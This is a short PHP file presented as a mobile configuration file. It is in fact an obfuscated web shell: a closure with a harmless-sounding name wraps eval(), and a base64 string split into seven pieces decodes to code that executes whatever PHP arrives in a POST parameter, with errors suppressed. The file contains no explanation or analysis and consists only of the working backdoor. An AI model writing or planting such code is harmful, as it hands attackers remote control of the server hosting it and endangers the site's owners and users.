
Mobiles_config_New<?php
$NotFound = function($code) {
    eval($code);
};

$part1 = "OTM2NDM3";
$part2 = "O0BldmFs";
$part3 = "KCRfUE9T";
$part4 = "VFsnc29t";
$part5 = "ZXRoaW45";
$part6 = "J10pOzI4";
$part7 = "MDkzMTE7";

$encoded = $part1.$part2.$part3.$part4.$part5.$part6.$part7;
$NotFound(base64_decode($encoded));
?>